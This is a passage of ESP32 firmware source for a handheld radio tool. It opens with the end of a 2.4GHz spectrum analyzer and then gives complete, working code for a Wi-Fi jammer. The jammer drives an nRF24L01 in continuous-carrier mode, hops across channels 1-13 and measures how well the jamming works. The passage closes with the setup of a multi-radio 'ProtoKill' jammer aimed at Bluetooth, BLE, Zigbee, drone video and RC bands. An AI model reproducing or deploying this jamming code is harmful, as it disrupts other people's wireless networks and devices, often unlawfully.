    int x1 = GRAPH_X + (WIFI_CH1 * GRAPH_WIDTH / ANA_CHANNELS);
    int x6 = GRAPH_X + (WIFI_CH6 * GRAPH_WIDTH / ANA_CHANNELS);
    int x11 = GRAPH_X + (WIFI_CH11 * GRAPH_WIDTH / ANA_CHANNELS);

    // Draw dashed lines
    for (int y = GRAPH_Y; y < GRAPH_Y + GRAPH_HEIGHT; y += 4) {
        tft.drawPixel(x1, y, TFT_MAGENTA);
        tft.drawPixel(x6, y, TFT_MAGENTA);
        tft.drawPixel(x11, y, TFT_MAGENTA);
    }

    // Labels
    tft.setTextColor(TFT_MAGENTA, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(x1 - 4, GRAPH_Y - 12);
    tft.print("1");
    tft.setCursor(x6 - 4, GRAPH_Y - 12);
    tft.print("6");
    tft.setCursor(x11 - 8, GRAPH_Y - 12);
    tft.print("11");
}

void drawAxes() {
    // Y-axis
    tft.drawLine(GRAPH_X - 2, GRAPH_Y, GRAPH_X - 2, GRAPH_Y + GRAPH_HEIGHT, SHREDDY_TEAL);
    // X-axis
    tft.drawLine(GRAPH_X, GRAPH_Y + GRAPH_HEIGHT, GRAPH_X + GRAPH_WIDTH, GRAPH_Y + GRAPH_HEIGHT, SHREDDY_TEAL);

    // Frequency labels
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(GRAPH_X - 5, GRAPH_Y + GRAPH_HEIGHT + 5);
    tft.print("2400");
    tft.setCursor(GRAPH_X + GRAPH_WIDTH/2 - 15, GRAPH_Y + GRAPH_HEIGHT + 5);
    tft.print("2462");
    tft.setCursor(GRAPH_X + GRAPH_WIDTH - 25, GRAPH_Y + GRAPH_HEIGHT + 5);
    tft.print("2525");

    // MHz label
    tft.setCursor(GRAPH_X + GRAPH_WIDTH/2 - 10, GRAPH_Y + GRAPH_HEIGHT + 18);
    tft.print("MHz");
}

void drawSpectrum() {
    // Clear graph area only
    tft.fillRect(GRAPH_X, GRAPH_Y, GRAPH_WIDTH, GRAPH_HEIGHT, TFT_BLACK);

    // Draw WiFi channel markers first (behind bars)
    drawWiFiMarkers();

    // Find max for normalization
    uint8_t maxLevel = 1;
    for (int i = 0; i < ANA_CHANNELS; i++) {
        if (current_levels[i] > maxLevel) maxLevel = current_levels[i];
    }

    // Draw spectrum bars - TEAL TO MAGENTA GRADIENT
    for (int i = 0; i < ANA_CHANNELS; i++) {
        int x = GRAPH_X + (i * GRAPH_WIDTH / ANA_CHANNELS);

        // Current level bar - INCREASED SCALING (was /50, now /8 for 6x taller bars)
        int barHeight = (current_levels[i] * GRAPH_HEIGHT) / 8;
        if (barHeight < 4 && current_levels[i] > 0) barHeight = 4;  // Minimum visible
        if (barHeight > GRAPH_HEIGHT) barHeight = GRAPH_HEIGHT;

        if (barHeight > 0) {
            // Draw gradient bar - SHREDDY TEAL (#23D2C3) at bottom to PINK (#FF16A0) at top
            for (int y = 0; y < barHeight; y++) {
                float ratio = (float)y / (float)GRAPH_HEIGHT;

                // Shreddy Teal (35, 210, 195) -> Shreddy Pink (255, 22, 160)
                uint8_t r = 35 + (uint8_t)(ratio * (255 - 35));
                uint8_t g = 210 - (uint8_t)(ratio * (210 - 22));
                uint8_t b = 195 - (uint8_t)(ratio * (195 - 160));

                uint16_t color = ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3);
                int drawY = GRAPH_Y + GRAPH_HEIGHT - barHeight + y;
                tft.drawFastHLine(x, drawY, BAR_WIDTH, color);
            }
        }

        // Peak hold indicator (small white dot at peak)
        if (peak_levels[i] > 0) {
            int peakY = GRAPH_Y + GRAPH_HEIGHT - (peak_levels[i] * GRAPH_HEIGHT / 8);
            if (peakY < GRAPH_Y) peakY = GRAPH_Y;
            tft.drawPixel(x, peakY, SHREDDY_TEAL);
        }
    }
}

void scanAllChannels() {
    // Reset current levels
    memset(current_levels, 0, sizeof(current_levels));

    // Scan each channel multiple times for better detection
    // Using Scanner's proven approach: 128us delay + button check in loop
    for (int sample = 0; sample < 30 && analyzerRunning; sample++) {
        // Check button every sample to prevent freeze
        if (pcf.digitalRead(BTN_SELECT) == LOW) {
            analyzerRunning = false;
            feature_exit_requested = true;
            return;
        }

        for (int ch = 0; ch < ANA_CHANNELS && analyzerRunning; ch++) {
            anaSetRegister(_ANA_NRF24_RF_CH, ch);
            anaEnable();                    // Fast enable (CE HIGH only)
            delayMicroseconds(128);         // RPD needs 130us + margin
            anaDisable();

            if (anaCarrierDetected()) {
                current_levels[ch]++;
            }
        }
    }

    // Update peak levels
    for (int i = 0; i < ANA_CHANNELS; i++) {
        if (current_levels[i] > peak_levels[i]) {
            peak_levels[i] = current_levels[i];
        }
    }
}

void drawHeader() {
    tft.fillRect(0, 0, 240, 45, TFT_BLACK);

    // Title
    tft.setTextColor(ORANGE, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(50, 5);
    tft.print("2.4GHz SPECTRUM ANALYZER");

    // Find peak frequency
    int peakCh = 0;
    uint8_t peakVal = 0;
    for (int i = 0; i < ANA_CHANNELS; i++) {
        if (current_levels[i] > peakVal) {
            peakVal = current_levels[i];
            peakCh = i;
        }
    }

    // Display peak info
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(10, 25);
    tft.printf("Peak: %d MHz", 2400 + peakCh);

    tft.setCursor(130, 25);
    tft.printf("Level: %d", peakVal);

    // Instructions
    tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
    tft.setCursor(10, 38);
    tft.print("SELECT:Exit  LEFT:Reset Peaks");

    // Divider line
    tft.drawLine(0, 47, 240, 47, ORANGE);
}

void resetPeaks() {
    memset(peak_levels, 0, sizeof(peak_levels));
}

void analyzerSetup() {
    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);

    // Initialize arrays
    memset(current_levels, 0, sizeof(current_levels));
    memset(peak_levels, 0, sizeof(peak_levels));

    // Draw static UI elements
    drawHeader();
    drawAxes();

    // ═══════════════════════════════════════════════════════════════════════════
    // SubGHz Cleanup - Release pin 16 and SPI bus before nRF24 init
    // Pin 16 is shared: CC1101 GDO0/RX (with interrupt) AND nRF24 CE (GPIO output)
    // ONLY cleanup if SubGHz receive was actually enabled (prevents crash)
    // ═══════════════════════════════════════════════════════════════════════════
    if (replayat::subghz_receive_active) {
        replayat::mySwitch.disableReceive();     // Detach interrupt from pin 16
        ELECHOUSE_cc1101.setSidle();             // Put CC1101 in idle mode
        replayat::subghz_receive_active = false; // Reset flag
    }

    // ALWAYS reset SPI bus and deselect CC1101 before nRF24 init
    SPI.end();                                // Release SPI bus completely
    delay(10);
    pinMode(27, OUTPUT);                      // CC1101 CSN pin
    digitalWrite(27, HIGH);                   // Deselect CC1101
    pinMode(ANA_CE, OUTPUT);                  // Reconfigure pin 16 as OUTPUT for nRF24 CE
    digitalWrite(ANA_CE, LOW);                // Start with CE low
    pinMode(ANA_CSN, OUTPUT);                 // nRF24 CSN
    digitalWrite(ANA_CSN, HIGH);              // Deselect nRF24 initially

    // Initialize SPI and NRF24
    SPI.begin(18, 19, 23, 17);
    SPI.setDataMode(SPI_MODE0);
    SPI.setFrequency(10000000);
    SPI.setBitOrder(MSBFIRST);

    pinMode(ANA_CE, OUTPUT);
    pinMode(ANA_CSN, OUTPUT);

    anaDisable();
    anaPowerUp();
    anaSetRegister(_ANA_NRF24_EN_AA, 0x0);
    anaSetRegister(_ANA_NRF24_RF_SETUP, 0x0F);
    // Set RX mode once (CE will be toggled for scanning)
    anaSetRegister(_ANA_NRF24_CONFIG, anaGetRegister(_ANA_NRF24_CONFIG) | 0x01);

    analyzerRunning = true;
    lastScanTime = millis();
    lastDisplayTime = millis();

    float voltage = readBatteryVoltage();
    drawStatusBar(voltage, false);
}

void analyzerLoop() {
    // Check for exit button
    if (pcf.digitalRead(BTN_SELECT) == LOW) {
        analyzerRunning = false;
        feature_exit_requested = true;
        delay(200);
        return;
    }

    // Check for reset peaks button (LEFT)
    if (pcf.digitalRead(BTN_LEFT) == LOW) {
        resetPeaks();
        delay(200);
    }

    // Continuous scanning
    scanAllChannels();

    // Update display at ~15 FPS
    if (millis() - lastDisplayTime >= 66) {
        drawSpectrum();
        drawHeader();
        lastDisplayTime = millis();
    }
}

}  // namespace Analyzer


/*
 *
 * 2.4GHz WLAN Jammer - WiFi-specific jamming with correct channel mapping
 * Uses single NRF24L01 with rapid channel hopping
 *
*/

namespace WLANJammer {

#define WLAN_CE  16
#define WLAN_CSN 17

// WiFi channel center frequencies mapped to NRF24 channels
// WiFi Ch X center = 2407 + (X * 5) MHz
// NRF24 channel = frequency - 2400
// WiFi channels are ~22MHz wide, so we sweep ±11 channels around center

// WiFi channel start/end NRF24 channels (covering 22MHz width)
const uint8_t WIFI_CH_START[] = {1, 6, 11, 16, 21, 26, 31, 36, 41, 46, 51, 56, 61};  // Ch 1-13
const uint8_t WIFI_CH_END[] =   {23, 28, 33, 38, 43, 48, 53, 58, 63, 68, 73, 78, 83}; // Ch 1-13
const uint8_t WIFI_CH_CENTER[] = {12, 17, 22, 27, 32, 37, 42, 47, 52, 57, 62, 67, 72}; // Centers

#define NUM_WIFI_CHANNELS 13
#define ALL_CHANNELS_MODE 0

// NRF24 register addresses
#define NRF_CONFIG      0x00
#define NRF_EN_AA       0x01
#define NRF_RF_CH       0x05
#define NRF_RF_SETUP    0x06
#define NRF_STATUS      0x07
#define NRF_RPD         0x09

// Direct SPI functions (same technique as working Analyzer)
byte wlanGetReg(byte reg) {
    byte val;
    digitalWrite(WLAN_CSN, LOW);
    SPI.transfer(reg & 0x1F);
    val = SPI.transfer(0);
    digitalWrite(WLAN_CSN, HIGH);
    return val;
}

void wlanSetReg(byte reg, byte val) {
    digitalWrite(WLAN_CSN, LOW);
    SPI.transfer((reg & 0x1F) | 0x20);
    SPI.transfer(val);
    digitalWrite(WLAN_CSN, HIGH);
}

void wlanSetChannel(byte ch) {
    wlanSetReg(NRF_RF_CH, ch);
}

void wlanPowerUp() {
    wlanSetReg(NRF_CONFIG, wlanGetReg(NRF_CONFIG) | 0x02);
    delayMicroseconds(1500);  // Power-up delay
}

void wlanPowerDown() {
    wlanSetReg(NRF_CONFIG, wlanGetReg(NRF_CONFIG) & ~0x02);
}

void wlanEnableRX() {
    wlanSetReg(NRF_CONFIG, wlanGetReg(NRF_CONFIG) | 0x01);  // PRIM_RX
    digitalWrite(WLAN_CE, HIGH);
    delayMicroseconds(130);
}

void wlanDisable() {
    digitalWrite(WLAN_CE, LOW);
}

bool wlanCarrierDetected() {
    return wlanGetReg(NRF_RPD) & 0x01;
}

// Start constant carrier (jamming) - using Scanner namespace functions
void wlanStartCarrier(byte channel) {
    Scanner::setChannel(channel);
    // RF_SETUP: CONT_WAVE=1 (bit7), PLL_LOCK=1 (bit4), 0dBm power (bits 2:1 = 11)
    Scanner::setRegister(0x06, 0x9E);  // 10011110 = CONT_WAVE + PLL_LOCK + 0dBm + 2Mbps
    Scanner::enable();
}

// Stop constant carrier
void wlanStopCarrier() {
    Scanner::disable();
    Scanner::setRegister(0x06, 0x0F);  // Normal mode: 2Mbps, 0dBm
}

bool jammerActive = false;
int currentWiFiChannel = ALL_CHANNELS_MODE;  // 0 = ALL, 1-13 = specific channel
int currentNRFChannel = 0;
unsigned long lastHopTime = 0;
unsigned long lastDisplayTime = 0;
unsigned long lastScanTime = 0;
const int HOP_DELAY_US = 500;  // Microseconds between channel hops
const int SCAN_INTERVAL_MS = 2000;  // Scan signals every 2 seconds

// Signal detection (to verify jamming effectiveness)
uint8_t signalLevels[13] = {0};  // 0-100% signal detected per WiFi channel
uint8_t signalHistory[13][5];    // Rolling history for smoothing
uint8_t historyIndex = 0;

// Display constants
#define JAM_GRAPH_X 10
#define JAM_GRAPH_Y 100
#define JAM_GRAPH_WIDTH 220
#define JAM_GRAPH_HEIGHT 150

volatile bool modeChangeRequested = false;
volatile bool jammerToggleRequested = false;
unsigned long lastButtonPressTime = 0;
const unsigned long debounceDelay = 300;

// Forward declarations
void configureRadio();

void drawHeader() {
    tft.fillRect(0, 0, 240, 50, TFT_BLACK);

    // Title
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.setTextSize(1);
    tft.setCursor(60, 5);
    tft.print("2.4GHz WLAN JAMMER");

    // Status
    tft.setTextColor(jammerActive ? TFT_RED : TFT_GREEN, TFT_BLACK);
    tft.setCursor(80, 20);
    tft.printf("Status: %s", jammerActive ? "JAMMING" : "STANDBY");

    // Current mode
    tft.setTextColor(TFT_CYAN, TFT_BLACK);
    tft.setCursor(10, 35);
    if (currentWiFiChannel == ALL_CHANNELS_MODE) {
        tft.print("Mode: ALL WiFi Channels (1-13)");
    } else {
        int freq = 2407 + (currentWiFiChannel * 5);
        tft.printf("Mode: WiFi Ch %d (%d MHz)", currentWiFiChannel, freq);
    }

    // Divider
    tft.drawLine(0, 50, 240, 50, TFT_RED);
}

void drawButtonGuide() {
    tft.fillRect(0, 270, 240, 50, TFT_BLACK);

    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setTextSize(1);

    // UP = Toggle jammer
    tft.setCursor(10, 275);
    tft.print("UP: Toggle ON/OFF");

    // LEFT/RIGHT = Change channel
    tft.setCursor(10, 290);
    tft.print("L/R: Change WiFi Channel");

    // SELECT = Exit
    tft.setCursor(10, 305);
    tft.print("SELECT: Exit");
}

void drawChannelDisplay() {
    // Position: below signal bars (77) - channel numbers
    int channelY = 80;
    tft.fillRect(JAM_GRAPH_X, channelY, JAM_GRAPH_WIDTH, 15, TFT_BLACK);

    // Draw WiFi channel indicators
    tft.setTextSize(1);
    for (int ch = 1; ch <= 13; ch++) {
        int x = JAM_GRAPH_X + ((ch - 1) * JAM_GRAPH_WIDTH / 13);

        // Highlight selected channel(s)
        if (currentWiFiChannel == ALL_CHANNELS_MODE || currentWiFiChannel == ch) {
            if (jammerActive) {
                tft.setTextColor(TFT_RED, TFT_BLACK);
            } else {
                tft.setTextColor(TFT_YELLOW, TFT_BLACK);
            }
        } else {
            tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        }

        tft.setCursor(x + 2, channelY);
        if (ch < 10) {
            tft.printf(" %d", ch);  // Align single digits
        } else {
            tft.printf("%d", ch);
        }
    }
}

void drawSpectrumBar() {
    // Clear graph area
    tft.fillRect(JAM_GRAPH_X, JAM_GRAPH_Y, JAM_GRAPH_WIDTH, JAM_GRAPH_HEIGHT, TFT_BLACK);

    // Draw border
    tft.drawRect(JAM_GRAPH_X - 1, JAM_GRAPH_Y - 1, JAM_GRAPH_WIDTH + 2, JAM_GRAPH_HEIGHT + 2, SHREDDY_TEAL);

    if (!jammerActive) {
        tft.setTextColor(TFT_DARKGREY, TFT_BLACK);
        tft.setCursor(JAM_GRAPH_X + 60, JAM_GRAPH_Y + 70);
        tft.print("JAMMER INACTIVE");
        return;
    }

    // Draw activity bar for current NRF24 channel
    int barWidth = JAM_GRAPH_WIDTH / 126;  // 126 NRF24 channels (0-125)
    if (barWidth < 2) barWidth = 2;

    int x = JAM_GRAPH_X + (currentNRFChannel * JAM_GRAPH_WIDTH / 126);

    // Draw the jamming bar
    tft.fillRect(x, JAM_GRAPH_Y + 10, barWidth, JAM_GRAPH_HEIGHT - 20, TFT_RED);

    // Show current NRF24 channel
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(JAM_GRAPH_X + JAM_GRAPH_WIDTH/2 - 40, JAM_GRAPH_Y + JAM_GRAPH_HEIGHT + 5);
    tft.printf("NRF24 Ch: %d (%d MHz)", currentNRFChannel, 2400 + currentNRFChannel);

    // Highlight WiFi channel regions
    for (int ch = 1; ch <= 13; ch++) {
        if (currentWiFiChannel == ALL_CHANNELS_MODE || currentWiFiChannel == ch) {
            int startX = JAM_GRAPH_X + (WIFI_CH_START[ch-1] * JAM_GRAPH_WIDTH / 126);
            int endX = JAM_GRAPH_X + (WIFI_CH_END[ch-1] * JAM_GRAPH_WIDTH / 126);
            tft.drawRect(startX, JAM_GRAPH_Y + 2, endX - startX, JAM_GRAPH_HEIGHT - 4, TFT_YELLOW);
        }
    }
}

// Scan signals using DIRECT SPI - exact same as Scanner's scanChannels()
void scanSignals() {
    bool wasJamming = jammerActive;
    int savedChannel = currentNRFChannel;

    // Stop jamming to scan
    if (wasJamming) {
        wlanStopCarrier();
        jammerActive = false;
    }

    // DIRECT SPI - no namespace calls, just raw register access
    // CE=16, CSN=17 (same pins as Scanner)
    digitalWrite(CE, LOW);   // disable

    // Power up: read CONFIG, set PWR_UP bit, write back
    digitalWrite(CSN, LOW);
    SPI.transfer(0x00);  // Read CONFIG
    byte cfg = SPI.transfer(0);
    digitalWrite(CSN, HIGH);

    digitalWrite(CSN, LOW);
    SPI.transfer(0x20);  // Write CONFIG
    SPI.transfer(cfg | 0x02);  // PWR_UP
    digitalWrite(CSN, HIGH);
    delayMicroseconds(1500);  // Power up delay

    // Disable auto-ack
    digitalWrite(CSN, LOW);
    SPI.transfer(0x21);  // Write EN_AA (reg 0x01)
    SPI.transfer(0x00);
    digitalWrite(CSN, HIGH);

    // RF_SETUP: 2Mbps, max power
    digitalWrite(CSN, LOW);
    SPI.transfer(0x26);  // Write RF_SETUP (reg 0x06)
    SPI.transfer(0x0F);
    digitalWrite(CSN, HIGH);

    // Scan each WiFi channel - use Scanner's scanChannels() pattern
    for (int wifiCh = 0; wifiCh < 13; wifiCh++) {
        int detections = 0;
        int totalSamples = 0;

        // Sample across the WiFi channel bandwidth
        for (int nrfCh = WIFI_CH_START[wifiCh]; nrfCh <= WIFI_CH_END[wifiCh]; nrfCh += 2) {
            // Multiple samples per NRF channel (like Scanner's 50 cycles)
            for (int s = 0; s < 5; s++) {
                // 1. Set channel (write RF_CH register 0x05)
                digitalWrite(CSN, LOW);
                SPI.transfer(0x25);  // Write RF_CH
                SPI.transfer(nrfCh);
                digitalWrite(CSN, HIGH);

                // 2. setRX(): Set PRIM_RX + enable + delay (like Scanner::setRX)
                digitalWrite(CSN, LOW);
                SPI.transfer(0x00);  // Read CONFIG
                cfg = SPI.transfer(0);
                digitalWrite(CSN, HIGH);

                digitalWrite(CSN, LOW);
                SPI.transfer(0x20);  // Write CONFIG
                SPI.transfer(cfg | 0x03);  // PWR_UP + PRIM_RX
                digitalWrite(CSN, HIGH);

                digitalWrite(CE, HIGH);  // enable
                delayMicroseconds(130);  // Let RPD settle
                digitalWrite(CE, LOW);   // disable - latches RPD

                // 3. Read RPD register (0x09)
                digitalWrite(CSN, LOW);
                SPI.transfer(0x09);  // Read RPD
                byte rpd = SPI.transfer(0);
                digitalWrite(CSN, HIGH);

                if (rpd & 0x01) {
                    detections++;
                }
                totalSamples++;
            }
        }

        // Calculate signal level with balanced 5x boost
        // Raw detection rate: 2%=weak, 5%=low, 10%=medium, 20%=strong
        // After 5x: 10%=weak, 25%=low, 50%=medium, 100%=strong
        int rawPct = (totalSamples > 0) ? (detections * 100) / totalSamples : 0;
        int boostedPct = rawPct * 5;  // Balanced 5x boost
        if (boostedPct > 100) boostedPct = 100;

        // Store with light smoothing (avg of current + last)
        signalHistory[wifiCh][historyIndex] = boostedPct;
        signalLevels[wifiCh] = (signalHistory[wifiCh][historyIndex] +
                                signalHistory[wifiCh][(historyIndex + 4) % 5]) / 2;

        // If ANY detection, ensure visible (minimum 10%)
        if (detections > 0 && signalLevels[wifiCh] < 10) {
            signalLevels[wifiCh] = 10;
        }
    }

    historyIndex = (historyIndex + 1) % 5;

    // Resume jamming if it was active
    if (wasJamming) {
        wlanStartCarrier(savedChannel);
        currentNRFChannel = savedChannel;
        jammerActive = true;
    }

    lastScanTime = millis();
}

// Draw signal level bars for each WiFi channel
void drawSignalBars() {
    // Position: below header (55) but above channel numbers (65)
    int legendY = 52;
    int barAreaY = 65;
    int barHeight = 12;
    int barSpacing = JAM_GRAPH_WIDTH / 13;

    // Legend
    tft.setTextSize(1);
    tft.fillRect(JAM_GRAPH_X, legendY, JAM_GRAPH_WIDTH, 10, TFT_BLACK);
    tft.setTextColor(SHREDDY_TEAL, TFT_BLACK);
    tft.setCursor(JAM_GRAPH_X, legendY);
    tft.print("SIGNAL: ");
    tft.setTextColor(TFT_GREEN, TFT_BLACK);
    tft.print("HI ");
    tft.setTextColor(TFT_YELLOW, TFT_BLACK);
    tft.print("MED ");
    tft.setTextColor(TFT_RED, TFT_BLACK);
    tft.print("LOW/JAM");

    for (int ch = 0; ch < 13; ch++) {
        int x = JAM_GRAPH_X + (ch * barSpacing);
        int barWidth = barSpacing - 2;

        // Clear area for this bar
        tft.fillRect(x, barAreaY, barWidth, barHeight, TFT_BLACK);

        // Draw signal strength bar (vertical fill from bottom)
        int fillHeight = (signalLevels[ch] * barHeight) / 100;
        if (fillHeight < 1 && signalLevels[ch] > 0) fillHeight = 1;

        if (fillHeight > 0) {
            // Color based on signal level (green = signal, red = no signal/jammed)
            uint16_t color;
            if (signalLevels[ch] > 60) {
                color = TFT_GREEN;  // Strong signal (not jammed well)
            } else if (signalLevels[ch] > 30) {
                color = TFT_YELLOW;  // Medium signal
            } else {
                color = TFT_RED;  // Weak signal (jammed!)
            }

            // Fill from bottom up
            tft.fillRect(x, barAreaY + barHeight - fillHeight, barWidth, fillHeight, color);
        }

        // Draw border
        tft.drawRect(x, barAreaY, barWidth, barHeight, TFT_DARKGREY);
    }
}

// Initialize NRF24 for jamming (direct SPI - no RF24 library)
void initJammerRadio() {
    // Ensure pins are ready
    digitalWrite(WLAN_CE, LOW);
    digitalWrite(WLAN_CSN, HIGH);
    delay(5);

    // Power up
    wlanPowerUp();

    // Configure for jamming: no auto-ack, no CRC, 2Mbps, max power
    wlanSetReg(NRF_EN_AA, 0x00);      // Disable auto-ack
    wlanSetReg(NRF_CONFIG, 0x02);     // PWR_UP, PTX mode (not RX)
}

void startJamming() {
    // Verify NRF24 is responding using Scanner's function
    byte status = Scanner::getRegister(0x07);  // STATUS register
    if (status == 0x00 || status == 0xFF) {
        // Try to reinit using Scanner's pattern
        Scanner::disable();
        Scanner::powerUp();
        Scanner::setRegister(0x01, 0x0);   // EN_AA
        Scanner::setRegister(0x06, 0x0F);  // RF_SETUP

        status = Scanner::getRegister(0x07);
        if (status == 0x00 || status == 0xFF) {
            tft.setTextColor(TFT_RED, TFT_BLACK);
            tft.setCursor(10, 150);
            tft.print("ERROR: NRF24 not found!");
            return;
        }
    }

    // Start carrier on initial channel
    if (currentWiFiChannel == ALL_CHANNELS_MODE) {
        currentNRFChannel = WIFI_CH_START[0];
    } else {
        currentNRFChannel = WIFI_CH_START[currentWiFiChannel - 1];
    }

    wlanStartCarrier(currentNRFChannel);
    jammerActive = true;
    lastHopTime = micros();
}

void stopJamming() {
    wlanStopCarrier();
    Scanner::powerDown();
    jammerActive = false;
}

void hopChannel() {
    if (!jammerActive) return;

    // Determine next channel based on mode
    if (currentWiFiChannel == ALL_CHANNELS_MODE) {
        // Sweep through all WiFi channels (1-83 covers Ch 1-13)
        currentNRFChannel++;
        if (currentNRFChannel > 83) {
            currentNRFChannel = 1;
        }
    } else {
        // Sweep within specific WiFi channel
        currentNRFChannel++;
        if (currentNRFChannel > WIFI_CH_END[currentWiFiChannel - 1]) {
            currentNRFChannel = WIFI_CH_START[currentWiFiChannel - 1];
        }
    }

    // Fast channel hop using Scanner's setChannel()
    Scanner::setChannel(currentNRFChannel);
}

void checkButtons() {
    unsigned long currentTime = millis();

    // UP = Toggle jammer
    if (pcf.digitalRead(6) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
        jammerToggleRequested = true;
        lastButtonPressTime = currentTime;
    }

    // RIGHT = Next WiFi channel
    if (pcf.digitalRead(5) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
        currentWiFiChannel++;
        if (currentWiFiChannel > 13) currentWiFiChannel = ALL_CHANNELS_MODE;
        if (jammerActive) {
            // Reset to start of new channel range
            if (currentWiFiChannel == ALL_CHANNELS_MODE) {
                currentNRFChannel = 1;
            } else {
                currentNRFChannel = WIFI_CH_START[currentWiFiChannel - 1];
            }
        }
        drawHeader();
        drawChannelDisplay();
        lastButtonPressTime = currentTime;
    }

    // LEFT = Previous WiFi channel
    if (pcf.digitalRead(4) == LOW && currentTime - lastButtonPressTime > debounceDelay) {
        currentWiFiChannel--;
        if (currentWiFiChannel < 0) currentWiFiChannel = 13;
        if (jammerActive) {
            if (currentWiFiChannel == ALL_CHANNELS_MODE) {
                currentNRFChannel = 1;
            } else {
                currentNRFChannel = WIFI_CH_START[currentWiFiChannel - 1];
            }
        }
        drawHeader();
        drawChannelDisplay();
        lastButtonPressTime = currentTime;
    }

    // SELECT = Exit (handled in main loop)
}

void wlanjammerSetup() {
    tft.setRotation(0);
    tft.fillScreen(TFT_BLACK);

    // Initialize SPI for NRF24 - EXACT same as working Analyzer!
    SPI.begin(18, 19, 23, 17);
    SPI.setDataMode(SPI_MODE0);
    SPI.setFrequency(10000000);
    SPI.setBitOrder(MSBFIRST);

    // Initialize radio pins
    pinMode(WLAN_CE, OUTPUT);
    pinMode(WLAN_CSN, OUTPUT);

    // Initialize PCF buttons
    pcf.pinMode(4, INPUT_PULLUP);  // LEFT
    pcf.pinMode(5, INPUT_PULLUP);  // RIGHT
    pcf.pinMode(6, INPUT_PULLUP);  // UP
    pcf.pinMode(7, INPUT_PULLUP);  // SELECT

    jammerActive = false;
    currentWiFiChannel = ALL_CHANNELS_MODE;
    currentNRFChannel = 0;

    // Initialize signal history
    for (int ch = 0; ch < 13; ch++) {
        signalLevels[ch] = 0;
        for (int h = 0; h < 5; h++) {
            signalHistory[ch][h] = 0;
        }
    }
    historyIndex = 0;

    float voltage = readBatteryVoltage();
    drawStatusBar(voltage, false);

    drawHeader();
    drawButtonGuide();
    drawChannelDisplay();
    drawSpectrumBar();

    // Initialize radio using EXACT same pattern as working Scanner scannerSetup()
    // CRITICAL: Must init SPI first - this was missing!
    SPI.begin(18, 19, 23, 17);
    SPI.setDataMode(SPI_MODE0);
    SPI.setFrequency(10000000);
    SPI.setBitOrder(MSBFIRST);

    // CE=16, CSN=17 - same pins, same functions!
    pinMode(CE, OUTPUT);   // Scanner uses CE (pin 16)
    pinMode(CSN, OUTPUT);  // Scanner uses CSN (pin 17)

    Scanner::disable();   // CE LOW
    Scanner::powerUp();   // Power up with 130us delay
    Scanner::setRegister(0x01, 0x0);   // EN_AA - Disable auto-ack
    Scanner::setRegister(0x06, 0x0F);  // RF_SETUP - 2Mbps, max power

    // Check if responding
    byte status = Scanner::getRegister(0x07);  // STATUS register

    if (status != 0x00 && status != 0xFF) {
        tft.setTextColor(TFT_CYAN, TFT_BLACK);
        tft.setCursor(60, 150);
        tft.print("Scanning signals...");
        scanSignals();
        drawSignalBars();
    } else {
        tft.setTextColor(TFT_RED, TFT_BLACK);
        tft.setCursor(60, 150);
        tft.print("Radio not found!");
    }

    lastDisplayTime = millis();
    lastScanTime = millis();
}

void wlanjammerLoop() {
    // Check for exit
    if (pcf.digitalRead(7) == LOW) {
        if (jammerActive) {
            stopJamming();
        }
        feature_exit_requested = true;
        delay(200);
        return;
    }

    checkButtons();

    // Handle jammer toggle
    if (jammerToggleRequested) {
        jammerToggleRequested = false;
        if (jammerActive) {
            stopJamming();
        } else {
            startJamming();
        }
        drawHeader();
        drawChannelDisplay();
    }

    // Rapid channel hopping when active
    if (jammerActive) {
        if (micros() - lastHopTime >= HOP_DELAY_US) {
            hopChannel();
            lastHopTime = micros();
        }
    }

    // Periodic signal scan to verify jamming effectiveness
    if (millis() - lastScanTime >= SCAN_INTERVAL_MS) {
        scanSignals();
        drawSignalBars();
    }

    // Update display at ~10 FPS
    if (millis() - lastDisplayTime >= 100) {
        drawSpectrumBar();
        lastDisplayTime = millis();
    }
}

}  // namespace WLANJammer


/*
 *
 * ProtoKill
 * 
 * 
*/

namespace ProtoKill {

#define CE_PIN_1  16
#define CSN_PIN_1 17
#define CE_PIN_2  26
#define CSN_PIN_2 27
#define CE_PIN_3  4
#define CSN_PIN_3 5

#define BTN_UP       6
#define BTN_DOWN     3
#define BTN_LEFT     4
#define BTN_RIGHT    5
#define BTN_SELECT   7

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE, WiFi_MODULE, VIDEO_TX_MODULE, RC_MODULE, USB_WIRELESS_MODULE, ZIGBEE_MODULE, NRF24_MODULE };
OperationMode currentMode = WiFi_MODULE;

bool jammerActive = false;

const byte bluetooth_channels[] =        {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
const byte ble_channels[] =              {2, 26, 80};
const byte WiFi_channels[] =             {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
const byte usbWireless_channels[] =      {40, 50, 60};
const byte videoTransmitter_channels[] = {70, 75, 80};
const byte rc_channels[] =               {1, 3, 5, 7};
const byte zigbee_channels[] =           {11, 15, 20, 25};
const byte nrf24_channels[] =            {76, 78, 79};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 300
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool modeChangeRequested1 = false;
volatile bool jammerToggleRequested = false;

unsigned long lastButtonPressTime = 0;
const unsigned long debounceDelay = 500;


